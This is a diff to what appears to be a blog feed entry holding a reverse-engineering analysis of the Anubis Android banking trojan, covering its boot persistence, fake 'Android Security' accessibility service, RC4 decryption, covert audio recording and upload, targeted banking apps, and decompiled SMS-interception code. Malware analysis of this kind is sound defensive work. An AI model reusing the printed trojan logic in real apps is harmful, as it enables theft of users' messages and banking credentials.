@@ -93,7 +93,8 @@ up, which helps malware to persist on a device.&lt;/p&gt;
         &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;/receiver&amp;gt;&lt;/span&gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;The receiver &lt;code&gt;&amp;quot;wocwvy.czyxoxmbauu.slsa.pworotsvjdlioho.hypihteeavv&lt;/code&gt; is listening for &lt;code&gt;BOOT_COMPLETED&lt;/code&gt;, &lt;code&gt;PACKAGE_ADDED&lt;/code&gt;, &lt;code&gt;SMS_RECEIVED&lt;/code&gt; and many more stuff. it looks like this one is really important.&lt;/p&gt;
 &lt;p&gt;Since we know this is a banking trojan, we assume that application is waiting for the user to
-install banking apps and the above mentioned class is responsible for that.&lt;/p&gt;
+install banking apps (PACKAGE_ADDED) and the above mentioned class is responsible for that.&lt;/p&gt;
+&lt;p&gt;To achieve persistence it is listening for BOOT_COMPLETED.&lt;/p&gt;
 &lt;p&gt;manifest also mentions that the application uses accessibility framework, by class &lt;code&gt;wocwvy.czyxoxmbauu.slsa.egxltnv&lt;/code&gt;&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-xml&#34; data-lang=&#34;xml&#34;&gt;        &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;service&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;android:label=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Android Security&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;android:name=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;wocwvy.czyxoxmbauu.slsa.egxltnv&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;android:permission=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;android.permission.BIND_ACCESSIBILITY_SERVICE&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt;
             &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;intent-filter&amp;gt;&lt;/span&gt;
@@ -713,7 +714,8 @@ preference. So my assumption on &lt;code&gt;SomeHttpClass.mo226c&lt;/code&gt; be
         &lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
     &lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;So it does look like this function is not only a decoder but also a decrypter. Let&amp;rsquo;s take a look at class &lt;code&gt;C0063a&lt;/code&gt;.&lt;/p&gt;
-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;public class C0063a {
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;/* rename this to RC4 */
+public class C0063a {
 
     [... code here]
 
@@ -818,7 +820,10 @@ class &lt;code&gt;C0067b&lt;/code&gt; and a string.&lt;/p&gt;
         &lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
     &lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;inside the try block we see a call to a famililar method, getSharedPreference. In this case key is &lt;code&gt;&amp;quot;url&amp;quot;&lt;/code&gt;.
-let&amp;rsquo;s search the xml for the key.&lt;/p&gt;
+well if search the xml, you wont find any.&lt;/p&gt;
+&lt;p&gt;Now the problem is, how is this thing retrieving value of a shared preference with a non-existing key?&lt;/p&gt;
+&lt;p&gt;Probably because malware is generating and writing the url dynamically to the xml.&lt;/p&gt;
+&lt;p&gt;Let&amp;rsquo;s analyze the method that makes use of above &lt;strong&gt;php endpoints&lt;/strong&gt;.&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-java&#34; data-lang=&#34;java&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;public&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;mo211a&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;Context context&lt;span style=&#34;color:#f92672&#34;&gt;,&lt;/span&gt; String str&lt;span style=&#34;color:#f92672&#34;&gt;,&lt;/span&gt; String str2&lt;span style=&#34;color:#f92672&#34;&gt;,&lt;/span&gt; String str3&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt; 
         String e &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; getSharedPreference&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;context&lt;span style=&#34;color:#f92672&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;websocket&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;);&lt;/span&gt;
         StringBuilder sb &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;new&lt;/span&gt; StringBuilder&lt;span style=&#34;color:#f92672&#34;&gt;();&lt;/span&gt;
@@ -1004,6 +1009,7 @@ we see another call &lt;code&gt;SomeHttpClass.mo213a&lt;/code&gt; but this time 
     &lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;this is the block that actually starts the thread :).
 Soo what this method actually does is, it starts recording audio on the given source, waits until &lt;code&gt;i&lt;/code&gt; amount of time and stops recording. then it calls our &lt;code&gt;SomeHttpClass.SendFileToEndpoint&lt;/code&gt; method to send it to an endpoint so attacker can recieve the file.&lt;/p&gt;
+&lt;h3 id=&#34;banking-apps&#34;&gt;Banking Apps&lt;/h3&gt;
 &lt;p&gt;Lets get an idea of how this malware gets banking applications.&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-java&#34; data-lang=&#34;java&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;/* renamed from: wocwvy.czyxoxmbauu.slsa.a */&lt;/span&gt;
 &lt;span style=&#34;color:#66d9ef&#34;&gt;public&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;class&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;BankingApps&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
@@ -1083,7 +1089,16 @@ Soo what this method actually does is, it starts recording audio on the given so
 - com.ebay.mobile
 &lt;/code&gt;&lt;/pre&gt;
 &lt;p&gt;if it does, it replaces the name with an empty string and append the name to the end of &lt;code&gt;str&lt;/code&gt;.&lt;/p&gt;
-</content>
+&lt;p&gt;here is the list of applications that anubis targets.&lt;/p&gt;
+&lt;h3 id=&#34;sms-sending-recieving-and-spamming&#34;&gt;SMS Sending, Recieving and Spamming&lt;/h3&gt;
+&lt;p&gt;Some methods in &lt;code&gt;SomeHttpClass&lt;/code&gt; is responsible for reading, intercepting and spamming SMS messages.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-java&#34; data-lang=&#34;java&#34;&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;public&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;ReadSMS&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;Context context&lt;span style=&#34;color:#f92672&#34;&gt;,&lt;/span&gt; String str&lt;span style=&#34;color:#f92672&#34;&gt;,&lt;/span&gt; String str2&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
+        StringBuilder sb &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;new&lt;/span&gt; StringBuilder&lt;span style=&#34;color:#f92672&#34;&gt;();&lt;/span&gt;
+        sb&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;append&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;p=&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;);&lt;/span&gt;
+        sb&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;append&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;mo225c&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;mo247q&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;context&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;|Incoming SMS&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;\n&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Number: &amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; str &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;\n&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Text: &amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; str2 &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;\n&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;|&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;));&lt;/span&gt;
+        mo218b&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;context&lt;span style=&#34;color:#f92672&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;4&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;,&lt;/span&gt; sb&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;toString&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;());&lt;/span&gt;
+    &lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</content>
     </item>
     
     <item>
